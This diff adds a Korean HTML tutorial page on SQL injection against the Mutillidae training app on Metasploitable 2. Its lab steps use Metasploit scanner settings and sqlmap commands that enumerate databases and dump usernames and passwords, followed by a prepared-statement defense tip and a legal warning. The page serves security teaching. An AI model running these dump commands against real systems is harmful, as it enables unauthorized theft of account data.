@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>웹 보안 실무: SQL 인젝션(SQL Injection) 실습</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-filter: blur(12px); }
+        .code-block { font-family: 'Fira Code', monospace; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        
+        /* 다이어그램 선 애니메이션 */
+        .flow-line {
+            stroke-dasharray: 10;
+            animation: dash 5s linear infinite;
+        }
+        @keyframes dash {
+            to { stroke-dashoffset: -100; }
+        }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header: 기술 사양 및 타이틀 -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34, 211, 238, 0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">WEB-SEC-01 | SQL Injection (SQL 인젝션, 구조화 질의어 삽입)</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
+                    SQL Injection Attack Concept<br><span class="text-slate-100 text-2xl">Metasploit 기반 관리자 정보 탈취 기법</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
+                    THREAT SCORE: 9.8 / 10.0
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">Offensive Security Specialist</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+
+        <!-- Section 1: 이론 및 아키텍처 도식 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                1. 공격 메커니즘 개요 (Attack Mechanism Overview)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
+                    SQL Injection (SQL 인젝션, 구조화 질의어 삽입)은 웹 애플리케이션의 입력값 검증 미흡을 악용하여 데이터베이스(Database)에 임의의 쿼리를 주입하는 공격입니다. 이는 <strong>STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)</strong> 모델 중 <strong>Information Disclosure (정보 유출)</strong>와 <strong>Tampering (데이터 변조)</strong>에 해당하며, 최종적으로 관리자 권한을 획득하는 결과로 이어집니다.
+                </p>
+
+                <!-- 도식화 인포그래픽 영역 -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner overflow-hidden">
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: SQL 인젝션 공격 흐름도]
+                    </h4>
+                    <div class="relative flex flex-col md:flex-row items-center justify-between gap-8">
+                        <!-- Attacker -->
+                        <div class="flex-1 w-full text-center p-6 bg-slate-800 rounded-xl border border-red-900/30 shadow-lg group">
+                            <i data-lucide="skull" class="w-12 h-12 text-red-500 mx-auto mb-4 group-hover:scale-110 transition-transform"></i>
+                            <div class="font-black text-slate-100 text-sm">Attacker (공격자)</div>
+                            <p class="text-[10px] text-red-400 mt-1 uppercase">Kali Linux / Metasploit</p>
+                        </div>
+                        
+                        <!-- Attack Line -->
+                        <div class="hidden md:block flex-shrink-0">
+                            <svg width="60" height="20" viewBox="0 0 60 20">
+                                <path d="M0 10 L60 10" stroke="#ef4444" stroke-width="2" fill="none" class="flow-line" />
+                                <polygon points="55,5 60,10 55,15" fill="#ef4444" />
+                            </svg>
+                        </div>
+
+                        <!-- Web Server -->
+                        <div class="flex-1 w-full text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg relative">
+                            <i data-lucide="globe" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">Web Application (웹 앱)</div>
+                            <p class="text-[10px] text-cyan-400 mt-1 uppercase">Mutillidae / OWASP BWA</p>
+                            <div class="absolute -top-2 -right-2 bg-red-600 text-white text-[8px] px-2 py-0.5 rounded font-bold">VULNERABLE</div>
+                        </div>
+
+                         <!-- Query Line -->
+                        <div class="hidden md:block flex-shrink-0">
+                            <svg width="60" height="20" viewBox="0 0 60 20">
+                                <path d="M0 10 L60 10" stroke="#f59e0b" stroke-width="2" fill="none" class="flow-line" />
+                                <polygon points="55,5 60,10 55,15" fill="#f59e0b" />
+                            </svg>
+                        </div>
+
+                        <!-- Database -->
+                        <div class="flex-1 w-full text-center p-6 bg-slate-800 rounded-xl border border-blue-900/50 shadow-lg">
+                            <i data-lucide="database" class="w-12 h-12 text-blue-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">Target Database (대상 DB)</div>
+                            <p class="text-[10px] text-blue-400 mt-1 uppercase">MySQL / MariaDB</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: 실습 환경 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                2. 실습 구성 요소 (Lab Components)
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <!-- Attacker Node -->
+                <div class="section-card rounded-3xl p-8 border-red-900/30 shadow-xl relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">ATTACKER</div>
+                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
+                        <i data-lucide="terminal" class="w-6 h-6 text-red-500"></i> Kali Linux
+                    </h3>
+                    <ul class="space-y-4 text-sm text-slate-300">
+                        <li class="flex items-start gap-2">
+                            <i data-lucide="check-circle-2" class="w-4 h-4 text-red-500 mt-1"></i>
+                            <div><strong>MSF (Metasploit Framework):</strong> 모듈 기반 침투 테스트 프레임워크</div>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <i data-lucide="check-circle-2" class="w-4 h-4 text-red-500 mt-1"></i>
+                            <div><strong>sqlmap (SQL 주입 도구):</strong> DB 정보 추출 자동화 도구</div>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- Target Node -->
+                <div class="section-card rounded-3xl p-8 border-indigo-900/30 shadow-xl relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-indigo-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">TARGET</div>
+                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
+                        <i data-lucide="server" class="w-6 h-6 text-indigo-400"></i> Metasploitable 2
+                    </h3>
+                    <ul class="space-y-4 text-sm text-slate-300">
+                        <li class="flex items-start gap-2">
+                            <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-500 mt-1"></i>
+                            <div><strong>Mutillidae:</strong> 학습용 취약 웹 애플리케이션 서비스</div>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <i data-lucide="database-zap" class="w-4 h-4 text-indigo-400 mt-1"></i>
+                            <div><strong>MySQL DB:</strong> 민감한 사용자 정보가 저장된 저장소</div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: 명령어 및 절차 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                3. 실증 및 구현 절차 (Exploitation Steps)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-16">
+                
+                <!-- Step 01 -->
+                <div class="relative">
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-sm font-black italic shadow-[0_0_15px_rgba(34,211,238,0.6)]">01</span>
+                        <h3 class="text-xl font-bold text-slate-100">MSF 콘솔 기동 및 모듈 탐색</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 leading-relaxed">
+                            터미널에서 Metasploit(메타스플로잇)을 실행하고 웹 파라미터 취약점을 분석할 수 있는 보조(Auxiliary) 스캐너 모듈을 검색합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative group">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Kali Terminal</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">msfconsole</span></div>
+                            <div class="text-slate-500 mt-4"># SQL Injection 관련 모듈 검색</div>
+                            <div class="text-slate-200">msf6 > <span class="text-cyan-400">search sql_query</span></div>
+                            <div class="text-slate-200">msf6 > <span class="text-cyan-400">use auxiliary/scanner/http/blind_sql_query</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 02 -->
+                <div class="relative">
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-sm font-black italic shadow-[0_0_15px_rgba(34,211,238,0.6)]">02</span>
+                        <h3 class="text-xl font-bold text-slate-100">공격 옵션 설정 (Payload Configuration)</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 leading-relaxed">
+                            공격 대상 서버의 RHOSTS (Remote Hosts, 원격 호스트) 정보와 취약점이 의심되는 URI 경로 및 파라미터를 설정합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">MSF Options</div>
+                            <div class="text-slate-500"># 대상 서버 IP 설정</div>
+                            <div class="text-slate-200">msf6 auxiliary(...) > <span class="text-cyan-400">set RHOSTS 192.168.1.100</span></div>
+                            <div class="text-slate-500 mt-2"># 취약한 페이지 경로 설정</div>
+                            <div class="text-slate-200">msf6 auxiliary(...) > <span class="text-cyan-400">set TARGETURI /mutillidae/index.php?page=user-info.php</span></div>
+                            <div class="text-slate-500 mt-2"># 인젝션 포인트 파라미터 설정</div>
+                            <div class="text-slate-200">msf6 auxiliary(...) > <span class="text-cyan-400">set QUERY "username=admin"</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 03 -->
+                <div class="relative">
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-sm font-black italic shadow-[0_0_15px_rgba(34,211,238,0.6)]">03</span>
+                        <h3 class="text-xl font-bold text-slate-100">실행 및 DB 덤프 (Data Extraction)</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 leading-relaxed">
+                            설정된 옵션을 기반으로 공격을 수행합니다. 전문적인 데이터 추출을 위해 <strong>sqlmap (SQL 주입 자동화 도구)</strong>을 연동하여 관리자 계정 정보를 획득합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Exploit Execution</div>
+                            <div class="text-slate-200">msf6 auxiliary(...) > <span class="text-cyan-400">run</span></div>
+                            <div class="text-slate-500 mt-4"># SQLMAP을 활용한 계정 정보 덤프 (Dump)</div>
+                            <div class="text-slate-200">$ <span class="text-yellow-400">sqlmap -u "http://192.168.1.100/mutillidae/..." --dbs</span></div>
+                            <div class="text-slate-200">$ <span class="text-yellow-400">sqlmap -u "..." -D members -T users -C username,password --dump</span></div>
+                        </div>
+                        <div class="mt-4 p-4 bg-green-900/20 border border-green-500/30 rounded-xl">
+                            <p class="text-xs text-green-400 font-bold tracking-tight flex items-center gap-2">
+                                <i data-lucide="check-circle" class="w-3 h-3"></i> 성공 시 결과: admin / p@ssw0rd123 유출 확인
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Section 4: 전문가 분석 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                4. 보안 전문가 인사이트 (Architect Insight)
+            </h2>
+            <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
+                <div class="flex flex-col md:flex-row gap-8">
+                    <!-- Tip -->
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700 hover:border-cyan-500/50 transition-colors">
+                        <div class="text-cyan-400 mb-4"><i data-lucide="shield-check" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">방어 전략: Prepared Statements</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            SQL Injection을 방어하는 가장 근본적인 방법은 <strong>Prepared Statements (매개변수화된 쿼리)</strong>를 사용하는 것입니다. 이는 사용자 입력값을 쿼리 구조와 분리하여 처리함으로써 악의적인 코드가 실행되는 것을 원천 차단합니다.
+                        </p>
+                    </div>
+                    <!-- Warning -->
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700 hover:border-red-500/50 transition-colors">
+                        <div class="text-red-400 mb-4"><i data-lucide="gavel" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">법적 고지 및 윤리 (Ethics)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            본 실습 내용은 승인된 환경 내에서의 보안 진단 능력을 배양하기 위함입니다. 허가받지 않은 시스템에 대한 공격 시도는 '정보통신망 이용촉진 및 정보보호 등에 관한 법률'에 의해 엄격히 처벌받을 수 있습니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 Security Architect Pro. All rights reserved.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
+            본 문서는 고도화된 침투 테스트 기법을 다루고 있으며, 안전한 디지털 환경 구축을 위한 보안 아키텍트 지침서로 활용됩니다.
+        </p>
+    </footer>
+
+    <script>
+        // 아이콘 로드
+        lucide.createIcons();
+    </script>
+</body>
+</html>
